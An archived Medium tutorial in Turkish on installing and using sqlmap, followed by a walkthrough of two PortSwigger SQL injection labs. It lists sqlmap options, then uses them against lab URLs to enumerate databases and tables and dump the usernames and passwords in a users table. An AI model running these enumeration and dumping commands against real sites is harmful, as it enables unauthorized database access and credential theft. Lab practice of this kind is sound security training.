# The Basic SQLmap Tutorial and SQLInjection | PortswiggerLab with SQLMap

- **Source URL:** https://medium.com/@barsavak/the-basic-sqlmap-tutorial-and-sqlinjection-portswiggerlab-with-sqlmap-1bb0cdf086fb?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240827215512/https://medium.com/@barsavak/the-basic-sqlmap-tutorial-and-sqlinjection-portswiggerlab-with-sqlmap-1bb0cdf086fb
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6784 (id 6784)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# The Basic SQLmap Tutorial and SQLInjection | PortswiggerLab with SQLMap

# SQL Injection Nedir?

Merhaba arkadaşlar,

Bu yazımızda SQL Injection (SQLi) nedir, türleri nelerdir gibi detaylara fazla girmeyeceğiz. Bunun yerine, SQLmap kullanımı ve nasıl pratik yapabileceğiniz üzerine odaklanacağız. Ancak, SQL Injection’un ne olduğunu, nasıl gerçekleştiğini ve zararlarının neler olduğunu öğrenmek isterseniz, aşağıya bazı faydalı bağlantılar bırakıyorum. Bu bağlantılara göz atarak genel bir fikir sahibi olduktan sonra SQLmap konusuna dalabiliriz. İşte sizin için hazırladığım bağlantılar:

Bağlantılara göz attıktan sonra SQLmap kullanımı hakkında daha fazla bilgiye hazır olacaksınız. Şimdi, gelin hep birlikte SQLmap’in nasıl kullanılacağını öğrenelim ve pratik yapalım!

# SQLmapNedir?

SQLmap, web uygulamalarındaki SQL Injection güvenlik açıklarını tespit edip bunlardan yararlanmanıza yardımcı olan güçlü bir açık kaynaklı sızma testi aracıdır.

SQL Injection, bir saldırganın web sitesindeki kullanıcı giriş alanları aracılığıyla veritabanına gönderilen SQL sorgularını değiştirebildiği yaygın bir saldırı tekniğidir. Bu güvenlik açığını kullanarak saldırganlar, veritabanına yetkisiz erişim sağlayabilir, hassas bilgileri çalabilir, verileri değiştirebilir ve hatta rastgele komutlar çalıştırabilirler.

SQLmap, bu süreci otomatikleştirerek güvenlik uzmanlarının ve sızma testi uzmanlarının işini kolaylaştırır. MySQL, Oracle, PostgreSQL, Microsoft SQL Server ve daha birçok veritabanı yönetim sistemini destekler.

SQLmap ile web uygulamalarınızın güvenliğini nasıl değerlendirebileceğinizi öğrenmek için hazır mısınız? Hadi başlayalım!

# SQLmap Kurulumu

Bir terminal penceresi açın ve sistem paket listesini güncellemek için “sudo apt-get update” yazın

`sudo apt-get update`
Dilerseniz

Resmi depodan SQLmap’i yüklemek için “sudo apt-get install sqlmap” yazın.

`sudo apt-get install sqlmap`
Veya, Python ile birlikte gelen pip paket yöneticisi kullanılarakta kurulabilir.

```
sudo apt install python3
sudo apt install python
pip install sqlmap
```
Terminalde “sqlmap -h ” komutunu çalıştırarak kurulumu doğrulayın

# SQLmap’i Anlama

# 1. `-u` veya `--url`

- **Açıklama**: SQL enjeksiyon testi yapılacak URL’yi belirtir.
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1"`

# 2. `--dbs`

- **Açıklama**: Veritabanı isimlerini listelemek için kullanılır.
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1" --dbs`

# 3. `-D` veya `--dbname`

- **Açıklama**: Belirtilen veritabanı üzerinde işlem yapmak için kullanılır.
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1" -D mydatabase`

# 4. `--tables`

- **Açıklama**: Belirtilen veritabanındaki tabloları listelemek için kullanılır.
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1" -D mydatabase --tables`

# 5. `-T` veya `--table`

- **Açıklama**: Belirtilen tablo üzerinde işlem yapmak için kullanılır.
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1" -D mydatabase -T users`

# 6. `--columns`

- **Açıklama**: Belirtilen tablodaki sütunları listelemek için kullanılır.
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1" -D mydatabase -T users --columns`

# 7. `-C` veya `--column`

- **Açıklama**: Belirtilen sütun üzerinde işlem yapmak için kullanılır.
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1" -D mydatabase -T users -C username,password`

# 8. `--dump`

- **Açıklama**: Belirtilen veritabanı, tablo veya sütundaki verileri dökmek için kullanılır.
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1" -D mydatabase -T users --dump`

# 9. `-r` veya `--request-file`

- **Açıklama**: SQL enjeksiyon testi için HTTP isteğini içeren bir dosya belirtir.
- **Kullanım**: `sqlmap -r request.txt`

# 10. `--level`

- **Açıklama**: Tarama düzeyini belirler (1 ile 5 arasında).
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1" --level=3`

# 11. `--risk`

- **Açıklama**: Tarama risk seviyesini belirler (1 ile 3 arasında).
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1" --risk=2`

# 12. `--batch`

- **Açıklama**: Tüm sorulara varsayılan yanıtları vererek etkileşimli olmayan modu etkinleştirir.
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1" --batch`

# 13. `--random-agent`

- **Açıklama**: Rastgele bir User-Agent kullanır.
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1" --random-agent`

# 14. `--cookie`

- **Açıklama**: Özel çerezler kullanarak isteği gerçekleştirir.
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1" --cookie="PHPSESSID=abcdefg123456"`

# 15. `--technique`

- **Açıklama**: Kullanılacak SQL enjeksiyon tekniklerini belirtir (B: Boolean-based blind, E: Error-based, U: Union query-based, S: Stacked queries, T: Time-based blind).
- **Kullanım**: `sqlmap -u "http://www.example.com/index.php?id=1" --technique=BEUST`

# 16. `--`flush-session

`sqlmap -u "http://hedefsite.com/vulnerable.php?id=1" --flush-session`
Bu komut, belirtilen URL için daha önceki tüm oturum bilgilerini temizler ve yeni bir SQL enjeksiyon testi başlatır.

Bu parametreler, SQLmap’in temel işlevlerini kullanmanızı sağlar. Daha fazla bilgi ve detaylı kullanım için [SQLmap Cheat Sheet](https://www.stationx.net/sqlmap-cheat-sheet/) sayfasını ziyaret edebilirsiniz.

# Lab: SQL injection UNION attack, determining the number of columns returned by the query

Bildiğiniz gibi union select sorgusunu kullanabilmek için bizim kolon sayısını belirlememiz lazım burada kategori filtreleme kısmında bir sql injection açığı olduğu söylüyor bu filtreleme kısmını sqlmap e gönderelim bakalım bize ne yanıt döndürecek

`sqlmap -u https://0af0000a04bb1456816bd9bd004700a8.web-security-academy.net/filter?category=Accessories*  --batch`
# Title: Generic UNION query (NULL) — 3 columns

# Lab: SQL injection UNION attack, retrieving multiple values in a single column

Burada da aynı şekilde aynı yerde bir sql injection olduğunu söylüyor bu seferki Bu laboratuvarda amacınız, SQL enjeksiyonu zafiyetini kullanarak farklı bir tablodan veri elde etmektir.

`sqlmap -u https://0a9700b8041b492b81fdac8a00fd009a.web-security-academy.net/filter?category=Gifts`  herhangi bir değişiklik yapmadan yine sqlmap e sorgumuzu atıyoruz ve bize bir sqlinjrviton olduğunu doğruluto burada

sıdaki macımız veri tabnlarını görüntelemke olcaktır

```
sqlmap -u https://0a9700b8041b492b81fdac8a00fd009a.web-security-academy.net/filter?category=Gifts --dbs
```
veri tabanuımzı seçerek tablo isimşerini alalım şimd

`sqlmap -u https://0a9700b8041b492b81fdac8a00fd009a.web-security-academy.net/filter?category=Gifts -D public --tables`
şimdi tablomzuu secerek içerindeki kolon karı blirlemek

`sqlmap -u https://0a9700b8041b492b81fdac8a00fd009a.web-security-academy.net/filter?category=Gifts -D public -T users --columns` şimdi yapmamız gereken tek şey kolonların iinini görüntelme ilk olarak username ile başlıyalım

`sqlmap -u https://0a9700b8041b492b81fdac8a00fd009a.web-security-academy.net/filter?category=Gifts -D public -T users -C username --dump`
şimdi passwrod kolonunu yığalım

`sqlmap -u https://0a9700b8041b492b81fdac8a00fd009a.web-security-academy.net/filter?category=Gifts -D public -T users -C password --dump`
